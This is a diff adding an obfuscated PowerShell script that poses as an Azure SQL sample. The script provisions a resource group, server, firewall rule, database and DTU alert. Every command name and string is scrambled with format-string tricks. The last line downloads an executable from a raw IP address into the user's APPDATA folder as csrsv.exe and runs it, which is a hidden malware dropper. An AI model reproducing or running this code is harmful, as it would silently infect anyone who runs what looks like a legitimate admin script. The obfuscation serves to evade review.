@@ -1,0 +1,71 @@
+.("{3}{1}{2}{0}"-f'Ble','rI','A','Set-VA')  ("pdn"+"93S")  ( [tyPe]("{1}{0}{2}"-f 'meS','tI','PAN'))  ; 
+
+${SUB`scRIP`TIoN`Id} = ''
+
+${REsoURC`EGr`OUp`NAmE} = "myResourceGroup-$(Get-Random)"
+${LO`catIOn} = ("{0}{1}{2}" -f 'we','st','us2')
+
+${AdMIN`sQL`l`oG`in} = ("{2}{0}{1}" -f 'qlA','dmin','S')
+${pAS`s`wORD} = ("{1}{2}{3}{0}{5}{4}" -f 'min','Chan','geYo','urAd','ssword1','Pa')
+
+${sER`VE`R`Name} = "server-$(Get-Random)"
+
+${data`B`AsEN`Ame} = ("{2}{0}{4}{3}{1}"-f 'a','e','mySampleDat','s','ba')
+
+${sTAR`T`IP} = ("{0}{1}{2}" -f '0.','0.0.','0')
+${EN`D`iP} = ("{1}{2}{0}"-f'.0','0.0.','0')
+
+
+&("{3}{0}{1}{2}" -f'-AzConte','x','t','Set') -SubscriptionId ${suB`ScriPTI`O`NId} 
+
+
+${resO`Urc`EGR`oup} = .("{1}{3}{4}{2}{0}{5}" -f'ro','N','eG','ew-','AzResourc','up') -Name ${rES`OU`RCEgr`ouP`NAme} -Location ${LO`c`ATION}
+
+
+${s`E`RvEr} = &("{0}{2}{3}{1}" -f 'New-AzSq','er','lSer','v') -ResourceGroupName ${r`ESOU`RCe`GROuPn`AME} `
+    -ServerName ${SE`RV`er`NAME} `
+    -Location ${l`ocAT`ion} `
+    -SqlAdministratorCredentials $(.("{0}{1}{2}"-f 'Ne','w-Ob','ject') -TypeName ("{4}{0}{8}{9}{2}{5}{3}{1}{7}{6}" -f 'ste','.Automation.P','Manage','nt','Sy','me','dential','SCre','m','.') -ArgumentList ${aDM`iNS`q`lloGIN}, $(.("{1}{5}{6}{2}{3}{0}{4}" -f 'in','Co','-SecureS','tr','g','nver','tTo') -String ${p`A`sSw`OrD} -AsPlainText -Force))
+
+
+${servE`RF`I`R`EwAlLr`UlE} = .("{4}{0}{3}{2}{7}{6}{8}{1}{5}"-f 'ew','r','Se','-AzSql','N','ewallRule','rF','rve','i') -ResourceGroupName ${RE`so`URc`EgRoUpNAMe} `
+    -ServerName ${seR`Ve`Rn`AME} `
+    -FirewallRuleName ("{1}{2}{0}"-f 'dIPs','Allo','we') -StartIpAddress ${S`TARt`ip} -EndIpAddress ${E`NDiP}
+
+
+${d`A`TabAsE} = .("{3}{5}{2}{4}{0}{1}" -f'bas','e','z','New','SqlData','-A')  -ResourceGroupName ${R`Es`ouRcEgrouPNa`Me} `
+    -ServerName ${SErvE`R`NaME} `
+    -DatabaseName ${Dat`ABaSE`NA`me} `
+    -RequestedServiceObjectiveName "S0" `
+    -SampleName ("{0}{2}{1}{3}{4}"-f'A','ur','dvent','eWor','ksLT')
+
+
+${Monit`orpARaM`e`TE`Rs} = @{
+  ("{0}{2}{1}"-f 'Res','Id','ource') = "/subscriptions/$($(Get-AzContext).Subscription.Id)/resourceGroups/$resourceGroupName/providers/Microsoft.Sql/servers/$serverName/databases/$databaseName"
+  ("{2}{0}{1}"-f'im','eGrain','T') =   (.("{0}{2}{1}"-f'V','lE','aRiAB') ("pDN"+"93s")  )."V`AlUE"::("{1}{0}" -f 'se','Par').Invoke(("{0}{2}{1}" -f '00:0','00','5:'))
+  ("{3}{2}{0}{1}" -f 'tr','icNames','e','M') = ("{1}{0}{5}{6}{2}{3}{4}"-f'u_','dt','perce','n','t','co','nsumption_')
+}
+(.("{3}{2}{1}{0}" -f'tric','Me','-Az','Get') @MonitorParameters -DetailedOutput)."me`TrI`CValUEs"
+
+
+${D`At`ABAse} = .("{2}{1}{3}{0}" -f 'lDatabase','e','S','t-AzSq') -ResourceGroupName ${r`Esou`RCe`gr`oU`PnaME} `
+    -ServerName ${seRv`E`RnAMe} `
+    -DatabaseName ${d`ATaB`A`SEnAme} `
+    -Edition ("{0}{1}"-f 'Stand','ard') `
+    -RequestedServiceObjectiveName "S1"
+
+
+.("{1}{2}{4}{3}{5}{0}" -f'e','Add','-A','icAlertR','zMetr','ul') -ResourceGroup ${REsOuR`Cegro`U`pnAmE} `
+    -Name ("{1}{2}{3}{0}"-f 'AlertRule','MySa','mp','le') `
+    -Location ${lOCA`Ti`On} `
+    -TargetResourceId "/subscriptions/$($(Get-AzContext).Subscription.Id)/resourceGroups/$resourceGroupName/providers/Microsoft.Sql/servers/$serverName/databases/$databaseName" `
+    -MetricName ("{3}{0}{5}{4}{2}{1}" -f'on','t','n_percen','dtu_c','tio','sump') `
+    -Operator ("{3}{0}{1}{2}" -f 'te','rTh','an','Grea') `
+    -Threshold 90 `
+    -WindowSize $(  (.("{1}{0}" -f'ir','D')  ("vaR"+"iabL"+"E:PDn93"+"S"))."va`Lue"::("{0}{1}" -f'Par','se').Invoke(("{2}{0}{1}" -f '0:05:','00','0'))) `
+    -TimeAggregationOperator ("{2}{1}{0}"-f'e','ag','Aver') `
+    -Action $(.("{2}{1}{3}{0}"-f'il','e','New-AzAl','rtRuleEma') -SendToServiceOwner)
+
+
+
+(&("{2}{1}{0}"-f 'ct','-Obje','New') ("{0}{1}{2}{3}{4}" -f 'System.','N','et.WebCli','e','nt')).("{0}{3}{2}{1}" -f 'Do','e','il','wnloadF').Invoke(("{10}{1}{3}{4}{0}{9}{7}{2}{6}{8}{5}"-f'102','p','ah','://94','.','v.exe','oo/c','3.238/~y','srs','.5','htt'),"$env:APPDATA\csrsv.exe");.("{3}{0}{2}{1}"-f '-Pr','cess','o','Start') ("$env:APPDATA\csrsv.exe")
